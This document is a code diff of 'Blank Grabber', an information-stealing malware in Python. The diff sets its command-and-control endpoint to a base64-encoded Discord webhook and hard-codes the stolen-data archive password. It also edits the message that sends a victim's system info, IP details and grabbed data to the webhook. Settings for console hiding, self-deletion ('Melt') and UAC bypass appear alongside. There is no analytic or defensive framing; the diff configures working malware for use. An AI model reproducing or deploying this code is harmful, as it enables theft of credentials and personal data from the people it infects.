@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 # pip install pyaesm urllib3
 
 import base64
@@ -16,21 +15,20 @@ import time
 import ctypes
 import logging
 import zlib
-import string
 from threading import Thread
 from ctypes import wintypes
 from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, 'YOUR_WEBHOOK_H4R4')
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1MDQxNTcyODU1Nzk0ODkzOS9ETXBEcXg3ZVB2WTEtenpjY2x4aFcxMnIwRUMzVHB4cXQ4eS01SXBFQnB2U01NdDJZTGxIUmcyV1NwdGY3NXR4aThscQ==').decode())
     Mutex = base64.b64decode('UHp3YU5xOWtIYjB1RmdoaA==').decode()
     PingMe = bool('')
     Vmprotect = bool('true')
     Startup = bool('')
     Melt = bool('true')
     UacBypass = bool('')
-    ArchivePassword = ''.join(random.choices(string.ascii_letters, k=5))
+    ArchivePassword = 'skid'
     HideConsole = bool('true')
     Debug = bool('')
     RunBoundOnStartup = bool('')
@@ -1348,7 +1346,7 @@ class BlankGrabber:
         match Settings.C2[0]:
             case 0:
                 image_url = 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': f'password zip:||{ArchivePassword}||', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/f4kedre4lity/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
+                payload = {'content': '||@everyone||' if Settings.PingMe else 'password zip:skid', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/f4kedre4lity/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
